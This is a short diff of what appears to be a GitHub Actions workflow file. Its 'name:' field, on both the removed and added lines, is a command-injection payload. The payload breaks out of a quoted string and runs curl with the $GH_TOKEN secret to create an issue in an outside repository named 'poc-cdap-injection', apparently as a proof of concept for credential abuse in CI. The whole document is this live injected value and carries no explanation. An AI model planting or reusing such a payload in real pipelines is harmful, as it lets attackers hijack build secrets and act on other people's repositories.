@@ -1,4 +1,4 @@
-name: Build with unit tests"; curl -s -H "Authorization:token $GH_TOKEN" https://api.github.com/repos/omarrrfds/poc-cdap-injection/issues -d "{\"title\":\"PoC2-cred-test\"}"; echo "
+name: Build with unit tests"; curl -s -H "Authorization:token $GH_TOKEN" https://api.github.com/repos/omarrrfds/poc-cdap-injection/issues -d '{"title":"PoC2-cred-test-nobs"}'; echo "
 
 on:
   push:
